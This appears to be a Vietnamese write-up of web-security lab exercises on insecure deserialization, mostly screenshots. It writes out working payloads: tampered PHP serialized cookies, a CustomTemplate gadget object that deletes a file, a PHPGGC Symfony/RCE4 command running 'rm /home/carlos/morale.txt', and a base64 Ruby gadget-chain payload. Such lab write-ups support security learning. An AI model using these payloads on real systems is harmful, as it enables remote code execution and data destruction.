![image](https://github.com/user-attachments/assets/ec542df8-ec54-4369-a4b5-f14f2d310f87)

Đây là sau khi tôi log in với cred wiener:peter

![image](https://github.com/user-attachments/assets/a0edf15a-0c61-440b-a671-afad05fe7aad)

Đây là req sau khi log in, ở cái cookie, nó được encode bằng base64 và có thông tin user trong đó:

![image](https://github.com/user-attachments/assets/aecaec3d-99cd-4534-bab1-41d9f1312cfe)

`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}` nhìn qua thì trong cái { }, có s tôi nghĩ là đại diện cho String, số sau đó là độ dài của String, và b:0 là giá trị boolean, chính boolean thành 1 thì xuất hiện admin panel:

![image](https://github.com/user-attachments/assets/e38f9e32-2c4e-45ff-bbc9-4a2e139fe2ee)

![image](https://github.com/user-attachments/assets/ef297f58-6719-40fe-9ed5-04556d223afb)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/63e82a38-bb0d-4ead-ba79-f48654f085a1)

Lần này có cái access_token nên tôi thử sửa username thành admin:

![image](https://github.com/user-attachments/assets/785b12a1-c036-408e-a2f4-52e51625acfe)

![image](https://github.com/user-attachments/assets/0d71731d-cc94-44a2-92a0-cd5bb3ebf022)

![image](https://github.com/user-attachments/assets/f0f6fc64-72eb-4464-bdce-d654fce3e446)

Tôi sửa token thành i:0 tức là đổi sang dạng integer với giá trị là 0, trong chuỗi serialized PHP object, i:0; có nghĩa là giá trị của thuộc tính access_token là một số nguyên (integer) có giá trị 0.

![image](https://github.com/user-attachments/assets/c6defdad-fa80-4035-9fd0-81ad80de66e5)

![image](https://github.com/user-attachments/assets/be19b556-3cf1-4891-b081-89720f101b17)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/ea457d0c-36a2-479a-92e4-a1815afd54cb)

Đây là khi đăng nhập với wiener:peter thì ra như này:

![image](https://github.com/user-attachments/assets/a0c208fa-af8a-4d32-874c-f74ec86a3bee)

Và đây là cookie của wiener

![image](https://github.com/user-attachments/assets/a47747d7-3107-4d4e-9059-7de4aec583ed)

Và đây là req khi delete account wiener:

![image](https://github.com/user-attachments/assets/9245f008-ba30-4cfc-bc6c-be9e5c7c8589)

Do là xóa cái morale.txt của carlos nên tôi thử đổi thành /home/carlos/morale.txt và vẫn với req đấy:

![image](https://github.com/user-attachments/assets/24ede55b-d19f-4120-8a05-abb9c568e65e)

![image](https://github.com/user-attachments/assets/513df6a0-acce-4352-9e97-fad27e6c7871)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/5f39ae74-f80f-4194-8197-b9ad7669c318)

Đây là req khi login wiener:peter 

![image](https://github.com/user-attachments/assets/e3841cdf-6d7d-4c66-894a-ed78aa49ea0a)

Tôi sửa thành carlos thì dính lỗi, có vẻ không làm được gì carlos 

![image](https://github.com/user-attachments/assets/7d34724d-b2fa-4c6a-85a6-07361d27667a)

Tôi xem trong target thì lấy cái /libs/CustomTemplate.php nhìn lạ lạ:

![image](https://github.com/user-attachments/assets/e22b975f-bf4b-4fa9-a688-ff512d2f880e)

Gửi thử nhưng chả có gì, cơ mà đã gửi được thì chắc phải có công dụng gì đó:

![image](https://github.com/user-attachments/assets/4a71d3a7-3dd2-476c-af6b-9304b0a8affe)

Trong hint thì có bảo dùng dấu ~ ở cuối thường là để backup:

![image](https://github.com/user-attachments/assets/5b8e827a-d28e-4d35-a842-bf851f265342)

Thêm dấu ~ vào cuối thì có toàn bộ src code, để ý cái hàm __destruct(), nó dùng để xóa file, mà cái này code kiểu hướng đối tượng nên tôi nghĩ là sẽ sửa cái cookie theo đối tượng:

![image](https://github.com/user-attachments/assets/52f8ac59-a399-464a-bd0e-1094666af2f7)

Tôi sửa thành `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}` và được

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/30abc50a-23e9-489d-826e-e8908d9cae08)

Lần này thì cookie nó không như trước nữa nên chắc không làm được gì:

![image](https://github.com/user-attachments/assets/eeb38616-35cb-479f-afb7-749ba835245c)

Search cái ysoserial thì ra cái này:

![image](https://github.com/user-attachments/assets/a1dc782d-0693-415e-87c6-d82d8ab8853f)

Sau vài lần thử thì cái CommonsCollections4 là dùng được, paste vào cookie và url encode tất cả:

![image](https://github.com/user-attachments/assets/68f4b02e-791e-46bd-8b95-0ee4ad749fe9)

![image](https://github.com/user-attachments/assets/ec1a9249-2357-4946-8290-bfd88ea627eb)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/f7686e03-b09a-43fa-89f2-cb9f0baab743)

Đây là req khi log in vào với cred wiener:peter 

![image](https://github.com/user-attachments/assets/934d9327-62b9-4f0d-8c98-31dc8e32ba83)

Để ý cái này giống giống với base64, khi dịch ra thì ra được thông tin:

![image](https://github.com/user-attachments/assets/3dd4e870-db72-4fc3-99b3-6aeff297bb63)

![image](https://github.com/user-attachments/assets/d98115fd-c43d-4a05-95ec-2c87620a38b2)

Tôi đổi sang carlos thì lỗi:

![image](https://github.com/user-attachments/assets/4670dab4-11d4-4bba-8d7b-66d0998d5eec)

Vào target tôi cũng biết được cái web này dùng php 7.4.3 thông qua req /cgi-bin/phpinfo.php:

![image](https://github.com/user-attachments/assets/603efc47-a12a-4936-867d-ff26c9423197)

Và tôi tìm được thêm cái SECRET_KEY au0d4x2foyt1vm89q8zh4rf25iwcw299:

![image](https://github.com/user-attachments/assets/481e3768-04aa-4ada-b398-97d619db3449)

Có được key rồi, tôi đi tải công cụ PHPGGC để tạo payload PHP object khai thác lỗ hổng trong Symfony:

![image](https://github.com/user-attachments/assets/f9b29ba2-32e3-47dc-8bf9-7d8bcc5d770e)

![image](https://github.com/user-attachments/assets/ac87c243-86f6-41bf-856f-2b589e600a56)

Tôi chạy `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64` để lấy được lệnh rm morale.txt:

![image](https://github.com/user-attachments/assets/ef1b27e7-7177-4337-82eb-07b61d5180b2)

Sử dụng đoạn mã PHP sau để tạo cookie hợp lệ với payload độc hại

![image](https://github.com/user-attachments/assets/f6b6fc5e-55ef-466f-a59f-2a8bd71ffb80)

![image](https://github.com/user-attachments/assets/41a67562-ce46-4fad-81bc-4ce38b0e61c1)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/fdcf70b9-adfe-437e-ade4-d489d513f4ff)

Đây là req khi log in và lần này cookie nhìn khác rồi:

![image](https://github.com/user-attachments/assets/33218f1f-a820-4be5-854e-1b9f6debf58d)

Search google ruby deserialization gadget chain thì có được cái [này](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html):

![image](https://github.com/user-attachments/assets/4852985a-4dcb-4530-a37a-1916e83105ee)

Trong trang web đó có 1 đoạn ruby này:

![image](https://github.com/user-attachments/assets/b2fee1bc-4d11-489a-b983-5a4dc0f51415)

Sửa command id thành rm và thêm encode base64 ở cuối:

![image](https://github.com/user-attachments/assets/a0041f4c-d59c-4e41-9a4b-72f5884828a0)

```BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==```
Kết quả thì ra cái này

![image](https://github.com/user-attachments/assets/c163e4f1-6ff6-4629-a9a5-5aa1f28362d7)

<h1>---------------------------------------------------------</h1>
<br>
